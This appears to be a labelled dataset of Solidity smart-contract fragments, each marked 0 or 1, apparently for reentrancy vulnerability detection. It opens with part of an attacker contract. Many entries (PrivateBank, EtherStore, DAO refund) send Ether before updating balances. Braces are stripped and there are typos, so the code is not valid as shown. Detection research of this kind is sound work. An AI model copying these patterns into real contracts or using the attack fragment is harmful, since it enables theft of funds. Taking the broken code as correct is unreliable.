victim.call.value(amount)(bytes4(keccak256("Deposit()")));
function startAttack(uint256 amount) {
step1(amount);
step2(amount / 2);
1
---------------------------------
52 40500.sol
function payOut(address _recipient, uint _amount) returns (bool) {
if (msg.sender != owner || msg.value > 0 || (payOwnerOnly && _recipient != owner))
throw;
if (_recipient.call.value(_amount)()) {
PayOut(_recipient, _amount);
return true;
} else {
return false;
contract TokenInterface {
mapping (address => uint256) balances;
mapping (address => mapping (address => uint256)) allowed;
uint256 public totalSupply;
function createTokenProxy(address _tokenHolder) returns (bool success) {
if (now < closingTime && msg.value > 0 && (privateCreation == 0 || privateCreation == msg.sender)) {
uint token = (msg.value * 20) / divisor();
extraBalance.call.value(msg.value - token)();
balances[_tokenHolder] += token;
totalSupply += token;
weiGiven[_tokenHolder] += msg.value;
CreatedToken(_tokenHolder, token);
if (totalSupply >= minTokensToCreate && !isFueled) {
isFueled = true;
FuelingToDate(totalSupply);
return true;
throw;
function refund() noEther {
if (now > closingTime && !isFueled) {
if (extraBalance.balance >= extraBalance.accumulatedInput())
extraBalance.payOut(address(this), extraBalance.accumulatedInput());
if (msg.sender.call.value(weiGiven[msg.sender])()) {
Refund(msg.sender, weiGiven[msg.sender]);
totalSupply -= balances[msg.sender];
balances[msg.sender] = 0;
weiGiven[msg.sender] = 0;
function executeProposal(uint _proposalID, bytes _transactionData) noEther returns (bool _success) {
Proposal p = proposals[_proposalID];
uint waitPeriod = p.newCurator ? splitExecutionPeriod : executeProposalPeriod;
if (p.open && now > p.votingDeadline + waitPeriod) {
closeProposal(_proposalID);
return;
if (now < p.votingDeadline || !p.open || p.proposalHash != sha3(p.recipient, p.amount, _transactionData)) {
throw;
if (!isRecipientAllowed(p.recipient)) {
closeProposal(_proposalID);
p.creator.send(p.proposalDeposit);
return;
bool proposalCheck = true;
if (p.amount > actualBalance())
proposalCheck = false;
uint quorum = p.yea + p.nay;
if (_transactionData.length >= 4 && _transactionData[0] == 0x68
&& _transactionData[1] == 0x37 && _transactionData[2] == 0xff
&& _transactionData[3] == 0x1e
&& quorum < minQuorum(actualBalance() + rewardToken[address(this)])) {
proposalCheck = false;
if (quorum >= minQuorum(p.amount)) {
if (!p.creator.send(p.proposalDeposit))
throw;
lastTimeMinQuorumMet = now;
if (quorum > totalSupply / 5)
minQuorumDivisor = 5;
if (quorum >= minQuorum(p.amount) && p.yea > p.nay && proposalCheck) {
if (!p.recipient.call.value(p.amount)(_transactionData))
throw;
p.proposalPassed = true;
_success = true;
if (p.recipient != address(this) && p.recipient != address(rewardAccount) && p.recipient != address(DAOrewardAccount) && p.recipient != address(extraBalance) && p.recipient != address(curator)) {
rewardToken[address(this)] += p.amount;
totalRewardToken += p.amount;
closeProposal(_proposalID);
ProposalTallied(_proposalID, _success, quorum);
function newContract(address _newContract){
if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;
if (!_newContract.call.value(address(this).balance)()) {
throw;
rewardToken[_newContract] += rewardToken[address(this)];
rewardToken[address(this)] = 0;
DAOpaidOut[_newContract] += DAOpaidOut[address(this)];
DAOpaidOut[address(this)] = 0;
1
---------------------------------
53 39932.sol
function process(bytes32 _destination) payable returns (bool) {
if (msg.value < 100) throw;
var tax = msg.value * taxPerc / 100;
var refill = bytes4(sha3("refill(bytes32)"));
if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw;
return true;
contract Invoice is Mortal {
address   public signer;
uint      public closeBlock;
Comission public comission;
string    public description;
bytes32   public beneficiary;
uint      public value;
0
---------------------------------
54 35649.sol
function playerWithdrawPendingTransactions() public payoutsAreActive returns (bool) {
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
55 35661.sol
function refund() stopInEmergency {
if(getState() != State.Refunding) throw;
address investor = msg.sender;
if(balances[investor] == 0) throw;
uint amount = balances[investor];
delete balances[investor];
if(!(investor.call.value(amount)())) throw;
Refunded(investor, amount);
0
---------------------------------
56 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
57 31759.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) external {
bytes32 txHash = keccak256(byte(0x19), byte(0), this, nonce++, destination, value, data );
verifySignatures( sigV,sigR,sigS,txHash);
require(destination.call.value(value)(data));
0
---------------------------------
58 39890.sol
function authorizePayment(uint _idMilestone) internal {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status == MilestoneStatus.AuthorizedForPayment) throw;
milestone.status = MilestoneStatus.AuthorizedForPayment;
if(!milestone.paymentSource.call.value(0)(milestone.payData)) throw;
ProposalStatusChanged(_idMilestone, milestone.status);
function approveCompletedMilestone(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.reviewer) ||(milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
function requestMilestonePayment(uint _idMilestone) campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if ((msg.sender != milestone.milestoneLeadLink)&&(msg.sender != recipient))  hrow;
if ((milestone.status != MilestoneStatus.Completed) || (now < milestone.doneTime + milestone.reviewTime)) throw;
authorizePayment(_idMilestone);
function arbitrateApproveMilestone(uint _idMilestone) onlyArbitrator campaignNotCanceled notChanging {
if (_idMilestone >= milestones.length) throw;
Milestone milestone = milestones[_idMilestone];
if (milestone.status != MilestoneStatus.AcceptedAndInProgress) && (milestone.status != MilestoneStatus.Completed)) throw;
authorizePayment(_idMilestone);
0
---------------------------------
59 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
60 11885.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from,address _to,uint256 _value,bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract Ownable {
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
0
---------------------------------
61 37329.sol
function buyICO() onlyExecutorOrOwner {
if (getBlockNumber() < icoStartBlock) return;
if (this.balance == 0) return;
uint256 purchaseAmount = Math.min256(this.balance, purchaseCap);
assert(crowdSale.call.value(purchaseAmount)());
ICOPurchased(purchaseAmount);
0
---------------------------------
62 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
63 PrivateBank.sol
function CashOut(uint _am) {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
1
---------------------------------
64 28974.sol
function pay(address _addr, uint256 count) public payable {
assert(changeable==true);
assert(msg.value >= price*count);
if(!founder.call.value(price*count)() || !msg.sender.call.value(msg.value-price*count)()) {
revert();
s.update(_addr,count);
Buy(msg.sender,count);
function () public payable {
pay(msg.sender,1);
0
---------------------------------
65 919.sol
function upgradeToAndCall(string version, address implementation, bytes data) payable public onlyProxyOwner {
upgradeTo(version, implementation);
require(this.call.value(msg.value)(data));
contract EternalStorageProxyForStormMultisender is OwnedUpgradeabilityProxy, EternalStorage {
0
---------------------------------
66 39662.sol
function sendToCharger(uint id) {
if (msg.sender != Owner && msg.sender != Manager) return ;
var _amountForCharger = getAmountForCharger(id);
uint _priceOfCharger = Chargers[id].Address.getPrice() ;
if(_priceOfCharger> _amountForCharger){
uint difference  = _priceOfCharger - _amountForCharger;
calculateCountOfInvestmetnsInQueue(difference,id);
if(!Chargers[id].Address.call.value(_priceOfCharger)()) throw;
0
---------------------------------
67 31565.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
68 2013.sol
function executeTransaction(address destination, uint value, bytes data) public onlyOwner {
if (destination.call.value(value)(data))
emit Execution(destination,value,data);
else
emit ExecutionFailure(destination,value,data);
0
---------------------------------
69 16643.sol
function fundPuppets() public payable {
require(msg.sender == owner);
_share = SafeMath.div(msg.value, 4);
extra[0].call.value(_share).gas(800000)();
extra[1].call.value(_share).gas(800000)();
extra[2].call.value(_share).gas(800000)();
extra[3].call.value(_share).gas(800000)();
function() payable public{
contract Puppet {
mapping (uint256 => address) public target;
mapping (uint256 => address) public master;
constructor() payable public{
target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
function() public payable{
if(msg.sender != target[0]){
target[0].call.value(msg.value).gas(600000)();
0
---------------------------------
70 12182.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
71 30337.sol
function withdrawPayments() external returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) {
throw;
success = true;
0
---------------------------------
72 6881.sol
function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
uint256 tokenBalance = token.balanceOf(this);
require(_exchange.call.value(_value)(_data));
balances[msg.sender] = balances[msg.sender].sub(_value);
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
1
---------------------------------
73 35878.sol
function Forwarder(address _creator, bytes32 _regName, address _owner) public
RegBase(_creator, _regName, _owner)
forwardTo = owner;
function() public payable {
Forwarded(msg.sender, forwardTo, msg.value);
require(forwardTo.call.value(msg.value)(msg.data));
function createNew(bytes32 _regName, address _owner) public payable feePaid
returns (address kAddr_)
kAddr_ = address(new Forwarder(msg.sender, _regName, _owner));
Created(msg.sender, _regName, kAddr_);
0
---------------------------------
74 3255.sol
function endRound(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns)
uint256 _rID = rID_;
uint256 _winPID = round_[_rID].plyr;
uint256 _winTID = round_[_rID].team;
uint256 _pot = round_[_rID].pot;
uint256 _win = (_pot.mul(48)) / 100;
uint256 _com = (_pot / 50);
uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;
uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;
uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);
uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);
uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);
if (_dust > 0)
_gen = _gen.sub(_dust);
_res = _res.add(_dust);
plyr_[_winPID].win = _win.add(plyr_[_winPID].win);
if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()"))))
_p3d = _p3d.add(_com);
_com = 0;
round_[_rID].mask = _ppt.add(round_[_rID].mask);
_eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);
_eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);
_eventData_.winnerAddr = plyr_[_winPID].addr;
_eventData_.winnerName = plyr_[_winPID].name;
_eventData_.amountWon = _win;
_eventData_.genAmount = _gen;
_eventData_.P3DAmount = 0;
_eventData_.newPot = _res;
rID_++;
_rID++;
round_[_rID].strt = now;
round_[_rID].end = now.add(rndInit_).add(rndGap_);
round_[_rID].pot = _res;
return(_eventData_);
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns)
uint256 _com = _eth / 50;
uint256 _p3d;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_com = _com.add(_aff);
address(lol_offical_bank).call.value(_com)(bytes4(keccak256("deposit()")));
return(_eventData_);
0
---------------------------------
75 27263.sol
function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable {
if(msg.sender != address(this))throw;
if(target.call.value(amount)()) {
CashMove(amount, logMsg, target, currentOwner);
function Divest(uint amount)  public  {
if (investors[msg.sender] > 0 && amount > 0)  {
this.loggedTransfer(amount, "", msg.sender, owner);
investors[msg.sender] -= amount;
function withdraw() public {
if(msg.sender==owner) {
this.loggedTransfer(this.balance, "", msg.sender, owner);
1
---------------------------------
76 33835.sol
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data);
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) {
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
0
---------------------------------
77 37474.sol
function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) {
require(msg.sender==owner);
require(_to.call.value(_value)(_data));
return 0;
0
---------------------------------
78 4472.sol
function () public payable {
address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)();
0
---------------------------------
79 37676.sol
function send(address _to, uint _value, bytes _data) only_owner {
if (!_to.call.value(_value)(_data)) throw;
Sent(_to, _value, _data);
0
---------------------------------
80 33410.sol
function executeTransaction(uint transactionId) internal notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction tx = transactions[transactionId];
tx.executed = true;
if (tx.destination.call.value(tx.value)(tx.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
tx.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
81 22247.sol
function Collect(uint _am) public payable {
if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) {
if(msg.sender.call.value(_am)()) {
Accounts[msg.sender]-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function() public payable
Put(msg.sender);
1
---------------------------------
82 40366.sol
function execute(address _to, uint _value, bytes _data) {
if (!isRightBranch) throw;
if (msg.sender != owner) throw;
if (!_to.call.value (_value)(_data)) throw;
contract BranchSender {
bool public isRightBranch;
0
---------------------------------
83 14284.sol
function payCharity() payable public {
uint256 ethToPay = SafeMath.sub(totalEthCharityCollected, totalEthCharityRecieved);
require(ethToPay > 1);
totalEthCharityRecieved = SafeMath.add(totalEthCharityRecieved, ethToPay);
if(!giveEthCharityAddress.call.value(ethToPay).gas(400000)()) {
totalEthCharityRecieved = SafeMath.sub(totalEthCharityRecieved, ethToPay);
0
---------------------------------
84 9221.sol
function bet() payable
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount)
if (gameOwner==msg.sender)
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
85 40038.sol
function execute(address _to, uint _value, bytes _data) external onlyOwner returns (bytes32 _r) {
if (_to == address(tokenCtr)) throw;
if (underLimit(_value)) {
SingleTransact(msg.sender, _value, _to, _data);
if(!_to.call.value(_value)(_data))
return 0;
_r = sha3(msg.data, block.number);
if (!confirm(_r) && m_txs[_r].to == 0) {
m_txs[_r].to = _to;
m_txs[_r].value = _value;
m_txs[_r].data = _data;
ConfirmationNeeded(_r, msg.sender, _value, _to, _data);
function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) {
if (m_txs[_h].to != 0) {
if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data);
delete m_txs[_h];
return true;
1
---------------------------------
86 2189.sol
function transferAndCall(address _to, uint256 _value, bytes _data) public payable whenNotPaused returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
87 11705.sol
function commonWithdraw(address token, uint value) internal {
require (tokens[token][msg.sender] >= value);
tokens[token][msg.sender] -= value;
totalDeposited[token] -= value;
require((token != 0)? ERC20(token).transfer(msg.sender, value): msg.sender.call.value(value)() );
emit Withdraw(token, msg.sender, value, tokens[token][msg.sender]);
function withdraw(uint amount) public {
commonWithdraw(0, amount);
function withdrawToken(address token, uint amount) public {
commonWithdraw(token, amount);
0
---------------------------------
88 40589.sol
function sendRobust(address to, uint value) internal {
if (!to.send(value)) {
if (!to.call.value(value)()) throw;
function _fillOrder(address _from, uint numTokens) internal returns (bool) {
if (numTokens == 0) throw;
if (this.balance < numTokens * weiPerToken / decimalPlaces) throw;
if (!token.transferFrom(_from, owner, numTokens)) return false;
sendRobust(_from, numTokens * weiPerToken / decimalPlaces);
OrderFilled(_from, numTokens);
return true;
0
---------------------------------
89 EtherStore.sol
function withdrawFunds(uint256 _weiToWithdraw) public {
require(balances[msg.sender] >= _weiToWithdraw);
require(_weiToWithdraw <= withdrawalLimit);
require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
lastWithdrawTime[msg.sender] = now;
1
---------------------------------
90 27248.sol
function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) public {
require(sigR.length == threshold);
require(sigR.length == sigS.length && sigR.length == sigV.length);
bytes32 txHash = keccak256(byte(0x19), byte(0), address(this), destination, value, data, nonce);
address lastAdd = address(0);
for (uint i = 0; i < threshold; i++) {
address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]);
require(recovered > lastAdd && isOwner[recovered]);
lastAdd = recovered;
nonce = nonce + 1;
require(destination.call.value(value)(data));
0
---------------------------------
91 30046.sol
function executeTransaction() public onlyActiveUsersAllowed() transactionMustBePending() {
Transaction storage transaction = transactions[transactions.length - 1];
require(now > transaction.time_initiated + users[transaction.initiated_by].waiting_time);
transaction.is_executed = true;
transaction.time_finalized = now;
transaction.finalized_by = msg.sender;
transaction.execution_successful = transaction.destination.call.value(
transaction.value)(transaction.data);
1
---------------------------------
92 29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
93 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
1
---------------------------------
94 40416.sol
function withdraw(uint amount) {
if (msg.value>0) throw;
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] -= amount;
if (!msg.sender.call.value(amount)()) throw;
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
95 23166.sol
function buy(address recipient) payable public duringCrowdSale  {
require(!halted);
require(msg.value >= 0.01 ether);
uint256 tokens = msg.value.mul(35e4);
require(tokens > 0);
require(saleTokenSupply.add(tokens)<=coinAllocation );
balances[recipient] = balances[recipient].add(tokens);
totalSupply_ = totalSupply_.add(tokens);
saleTokenSupply = saleTokenSupply.add(tokens);
salesVolume = salesVolume.add(msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(msg.sender, recipient, msg.value, tokens);
function TorusCoin(uint256 startDatetimeInSeconds, address founderWallet) public {
admin = msg.sender;
founder = founderWallet;
